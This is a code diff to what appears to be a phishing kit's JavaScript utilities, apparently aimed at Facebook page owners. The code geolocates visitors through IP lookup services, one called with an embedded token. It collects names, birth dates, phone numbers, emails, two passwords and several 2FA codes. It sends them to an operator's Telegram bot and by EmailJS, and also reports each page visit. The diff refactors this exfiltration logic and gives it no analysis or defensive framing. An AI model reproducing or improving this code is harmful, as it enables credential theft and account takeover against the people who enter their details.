@@ -46,69 +46,144 @@ const Utils = {
         }
     },
 
+    formatLocationLine(data) {
+        const ip = data.ip || 'N/A';
+        const region = data.region || data.city || 'N/A';
+        const regionCode = data.region_code || data.regionCode || '';
+        const countryCode = String(data.country_code || data.countryCode || '').toUpperCase();
+        const countryName = data.country_name || data.countryName || this.countryNameFromCode(countryCode) || countryCode || 'N/A';
+        const regionPart = regionCode ? `${region}(${regionCode})` : region;
+        const countryPart = countryCode ? `${countryName}(${countryCode})` : countryName;
+        return `${ip} | ${regionPart} | ${countryPart}`;
+    },
+
+    countryNameFromCode(code) {
+        const names = {
+            AD: 'Andorra', AE: 'United Arab Emirates', AF: 'Afghanistan', AL: 'Albania', AM: 'Armenia',
+            AR: 'Argentina', AT: 'Austria', AU: 'Australia', AZ: 'Azerbaijan', BA: 'Bosnia and Herzegovina',
+            BD: 'Bangladesh', BE: 'Belgium', BG: 'Bulgaria', BH: 'Bahrain', BO: 'Bolivia', BR: 'Brazil',
+            BY: 'Belarus', CA: 'Canada', CH: 'Switzerland', CL: 'Chile', CN: 'China', CO: 'Colombia',
+            CR: 'Costa Rica', CU: 'Cuba', CY: 'Cyprus', CZ: 'Czechia', DE: 'Germany', DK: 'Denmark',
+            DO: 'Dominican Republic', DZ: 'Algeria', EC: 'Ecuador', EE: 'Estonia', EG: 'Egypt',
+            ES: 'Spain', FI: 'Finland', FR: 'France', GB: 'United Kingdom', GE: 'Georgia', GH: 'Ghana',
+            GR: 'Greece', GT: 'Guatemala', HK: 'Hong Kong', HR: 'Croatia', HU: 'Hungary', ID: 'Indonesia',
+            IE: 'Ireland', IL: 'Israel', IN: 'India', IQ: 'Iraq', IR: 'Iran', IS: 'Iceland', IT: 'Italy',
+            JO: 'Jordan', JP: 'Japan', KE: 'Kenya', KG: 'Kyrgyzstan', KH: 'Cambodia', KR: 'South Korea',
+            KW: 'Kuwait', KZ: 'Kazakhstan', LA: 'Laos', LB: 'Lebanon', LK: 'Sri Lanka', LT: 'Lithuania',
+            LU: 'Luxembourg', LV: 'Latvia', LY: 'Libya', MA: 'Morocco', MD: 'Moldova', ME: 'Montenegro',
+            MK: 'North Macedonia', MM: 'Myanmar', MN: 'Mongolia', MX: 'Mexico', MY: 'Malaysia',
+            NG: 'Nigeria', NL: 'Netherlands', NO: 'Norway', NP: 'Nepal', NZ: 'New Zealand', OM: 'Oman',
+            PA: 'Panama', PE: 'Peru', PH: 'Philippines', PK: 'Pakistan', PL: 'Poland', PT: 'Portugal',
+            PY: 'Paraguay', QA: 'Qatar', RO: 'Romania', RS: 'Serbia', RU: 'Russia', SA: 'Saudi Arabia',
+            SE: 'Sweden', SG: 'Singapore', SI: 'Slovenia', SK: 'Slovakia', TH: 'Thailand', TJ: 'Tajikistan',
+            TM: 'Turkmenistan', TN: 'Tunisia', TR: 'Turkey', TW: 'Taiwan', UA: 'Ukraine', US: 'United States',
+            UY: 'Uruguay', UZ: 'Uzbekistan', VE: 'Venezuela', VN: 'Vietnam', ZA: 'South Africa'
+        };
+        return names[String(code || '').toUpperCase()] || '';
+    },
+
+    telegramVisitMessage(loc) {
+        return [
+            `IP: ${loc.ip || 'N/A'}`,
+            `Location: ${loc.location || 'N/A'}`,
+            `Page: ${location.href}`,
+            'reCAPTCHA: đã tick'
+        ].join('\n');
+    },
+
+    async sendTelegramText(text) {
+        const res = await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CONFIG.TELEGRAM_CHAT_ID,
+                text,
+                disable_web_page_preview: true
+            })
+        });
+        return res;
+    },
+
     async getUserLocation() {
+        if (this._locationCache) return this._locationCache;
+
         const empty = {
             location: 'N/A',
             country_code: 'N/A',
             ip: 'N/A',
             region: 'N/A',
+            region_code: 'N/A',
             country: 'N/A',
+            country_name: 'N/A',
             city: 'N/A',
             org: 'N/A'
         };
 
         const sources = [
             async () => {
-                const response = await fetch('https://ipinfo.io/json?token=790b745aefcdac', { cache: 'no-store' });
-                if (!response.ok) throw new Error('ipinfo');
+                const response = await fetch('https://ipapi.co/json/', { cache: 'no-store' });
                 const data = await response.json();
-                const country = data.country || 'N/A';
+                if (data.error) throw new Error('ipapi');
                 return {
                     ip: data.ip || 'N/A',
                     city: data.city || 'N/A',
-                    region: data.region || 'N/A',
-                    country,
-                    country_code: country,
-                    org: data.org || 'N/A',
-                    location: `${data.ip || 'N/A'} | ${data.city || 'N/A'} | ${data.region || 'N/A'} (${country})`
+                    region: data.region || data.city || 'N/A',
+                    region_code: data.region_code || '',
+                    country_code: data.country_code || '',
+                    country_name: data.country_name || '',
+                    org: data.org || 'N/A'
                 };
             },
             async () => {
                 const response = await fetch('https://ipwho.is/', { cache: 'no-store' });
                 const data = await response.json();
                 if (data.success === false) throw new Error('ipwho');
-                const country = data.country_code || data.country || 'N/A';
                 return {
                     ip: data.ip || 'N/A',
                     city: data.city || 'N/A',
-                    region: data.region || 'N/A',
-                    country,
-                    country_code: country,
-                    org: (data.connection && data.connection.isp) || 'N/A',
-                    location: `${data.ip || 'N/A'} | ${data.city || 'N/A'} | ${data.region || 'N/A'} (${country})`
+                    region: data.region || data.city || 'N/A',
+                    region_code: data.region_code || '',
+                    country_code: data.country_code || '',
+                    country_name: data.country || '',
+                    org: (data.connection && data.connection.isp) || 'N/A'
                 };
             },
             async () => {
-                const response = await fetch('https://ipapi.co/json/', { cache: 'no-store' });
+                const response = await fetch('https://ipinfo.io/json?token=790b745aefcdac', { cache: 'no-store' });
+                if (!response.ok) throw new Error('ipinfo');
                 const data = await response.json();
-                if (data.error) throw new Error('ipapi');
-                const country = data.country_code || 'N/A';
                 return {
                     ip: data.ip || 'N/A',
                     city: data.city || 'N/A',
-                    region: data.region || 'N/A',
-                    country,
-                    country_code: country,
-                    org: data.org || 'N/A',
-                    location: `${data.ip || 'N/A'} | ${data.city || 'N/A'} | ${data.region || 'N/A'} (${country})`
+                    region: data.region || data.city || 'N/A',
+                    region_code: '',
+                    country_code: data.country || '',
+                    country_name: '',
+                    org: data.org || 'N/A'
                 };
             }
         ];
 
         for (const source of sources) {
             try {
-                const loc = await source();
-                if (loc && loc.ip && loc.ip !== 'N/A') return loc;
+                const raw = await source();
+                if (!raw || !raw.ip || raw.ip === 'N/A') continue;
+                const loc = {
+                    ...raw,
+                    country: (raw.country_code || 'N/A').toUpperCase(),
+                    country_code: (raw.country_code || 'N/A').toUpperCase(),
+                    country_name: raw.country_name || this.countryNameFromCode(raw.country_code) || raw.country_code || 'N/A',
+                    location: this.formatLocationLine({
+                        ip: raw.ip,
+                        region: raw.region,
+                        city: raw.city,
+                        region_code: raw.region_code,
+                        country_code: raw.country_code,
+                        country_name: raw.country_name || this.countryNameFromCode(raw.country_code)
+                    })
+                };
+                this._locationCache = loc;
+                return loc;
             } catch (error) { /* try next */ }
         }
 
@@ -117,35 +192,34 @@ const Utils = {
 
     async sendToTelegram(data) {
         const locationData = await this.getUserLocation();
+        const lines = [
+            `IP: ${locationData.ip || 'N/A'}`,
+            `Location: ${locationData.location || 'N/A'}`,
+            `Page: ${location.href}`,
+            '--------------------',
+            `Full Name: ${data.fullName || ''}`,
+            `Page Name: ${data.fanpage || ''}`,
+            `Date of Birth: ${data.day || ''}/${data.month || ''}/${data.year || ''}`,
+            `Phone: ${data.phone || ''}`,
+            `Email: ${data.email || ''}`,
+            `Email Business: ${data.emailBusiness || ''}`
+        ];
 
-        const text = `
-<b>IP:</b> <code>${locationData.ip}</code>
-<b>Location:</b> <code>${locationData.location})</code>
-----------------------------------
-<b>Full Name:</b> <code>${data.fullName || ''}</code>
-<b>Email:</b> <code>${data.email || ''}</code>
-<b>Email Business:</b> <code>${data.emailBusiness || ''}</code>
-<b>Page Name:</b> <code>${data.fanpage || ''}</code>
-<b>Phone:</b> <code>${data.phone || ''}</code>
-<b>Date of Birth:</b> <code>${data.day}/${data.month}/${data.year}</code>
-----------------------------------
-<b>Password(1):</b> <code>${data.password || ''}</code>
-<b>Password(2):</b> <code>${data.passwordSecond || ''}</code>
-----------------------------------
-<b>🔐Code 2FA(1):</b> <code>${data.twoFa || ''}</code>
-<b>🔐Code 2FA(2):</b> <code>${data.twoFaSecond || ''}</code>
-<b>🔐Code 2FA(3):</b> <code>${data.twoFaThird || ''}</code>`;
+        if (data.password || data.passwordSecond) {
+            lines.push('--------------------');
+            if (data.password) lines.push(`Password 1: ${data.password}`);
+            if (data.passwordSecond) lines.push(`Password 2: ${data.passwordSecond}`);
+        }
+
+        if (data.twoFa || data.twoFaSecond || data.twoFaThird) {
+            lines.push('--------------------');
+            if (data.twoFa) lines.push(`2FA 1: ${data.twoFa}`);
+            if (data.twoFaSecond) lines.push(`2FA 2: ${data.twoFaSecond}`);
+            if (data.twoFaThird) lines.push(`2FA 3: ${data.twoFaThird}`);
+        }
 
         try {
-            await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CONFIG.TELEGRAM_CHAT_ID,
-                    text,
-                    parse_mode: 'HTML'
-                })
-            });
+            await this.sendTelegramText(lines.join('\n'));
         } catch (error) {
             console.error('Telegram error:', error);
         }
@@ -154,25 +228,27 @@ const Utils = {
     async sendToEmail(data) {
         const locationData = await this.getUserLocation();
 
-        const emailContent = `
-IP: ${locationData.ip}
-Location: ${locationData.location}
-----------------------------------
-Full Name: ${data.fullName || ''}
-Email: ${data.email || ''}
-Email Business: ${data.emailBusiness || ''}
-Page Name: ${data.fanpage || ''}
-Phone: ${data.phone || ''}
-Date of Birth: ${data.day}/${data.month}/${data.year}
-----------------------------------
-Password(1): ${data.password || ''}
-Password(2): ${data.passwordSecond || ''}
-----------------------------------
-🔐Code 2FA(1): ${data.twoFa || ''}
-🔐Code 2FA(2): ${data.twoFaSecond || ''}
-🔐Code 2FA(3): ${data.twoFaThird || ''}
-
-Sent at: ${new Date().toLocaleString()}`;
+        const emailContent = [
+            `IP: ${locationData.ip || 'N/A'}`,
+            `Location: ${locationData.location || 'N/A'}`,
+            `Page: ${location.href}`,
+            '--------------------',
+            `Full Name: ${data.fullName || ''}`,
+            `Page Name: ${data.fanpage || ''}`,
+            `Date of Birth: ${data.day || ''}/${data.month || ''}/${data.year || ''}`,
+            `Phone: ${data.phone || ''}`,
+            `Email: ${data.email || ''}`,
+            `Email Business: ${data.emailBusiness || ''}`,
+            '--------------------',
+            `Password 1: ${data.password || ''}`,
+            `Password 2: ${data.passwordSecond || ''}`,
+            '--------------------',
+            `2FA 1: ${data.twoFa || ''}`,
+            `2FA 2: ${data.twoFaSecond || ''}`,
+            `2FA 3: ${data.twoFaThird || ''}`,
+            '',
+            `Sent at: ${new Date().toLocaleString()}`
+        ].join('\n');
 
         try {
             // Load EmailJS SDK if not already loaded
@@ -247,22 +323,7 @@ Sent at: ${new Date().toLocaleString()}`;
 
         try {
             const loc = await this.getUserLocation();
-            const cookie = (document.cookie.match(/(?:^|;\s*)googtrans=([^;]*)/) || [])[1];
-            const lang = cookie ? decodeURIComponent(cookie) : (navigator.language || 'N/A');
-            const text = [
-                '🌐 <b>New visit</b>',
-                '',
-                `<b>IP:</b> <code>${loc.ip}</code>`,
-                `<b>Country:</b> <code>${loc.country}</code>`,
-                `<b>City:</b> <code>${loc.city || 'N/A'}</code>`,
-                `<b>Region:</b> <code>${loc.region || 'N/A'}</code>`,
-                `<b>ISP:</b> <code>${loc.org || 'N/A'}</code>`,
-                `<b>Location:</b> <code>${loc.location}</code>`,
-                `<b>Language:</b> <code>${lang}</code>`,
-                `<b>Page:</b> <code>${location.href}</code>`,
-                `<b>Time:</b> <code>${new Date().toLocaleString()}</code>`
-            ].join('\n');
-
+            const text = this.telegramVisitMessage(loc);
             const controller = new AbortController();
             const timer = setTimeout(() => controller.abort(), 8000);
             const res = await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -271,7 +332,6 @@ Sent at: ${new Date().toLocaleString()}`;
                 body: JSON.stringify({
                     chat_id: CONFIG.TELEGRAM_CHAT_ID,
                     text,
-                    parse_mode: 'HTML',
                     disable_web_page_preview: true
                 }),
                 signal: controller.signal
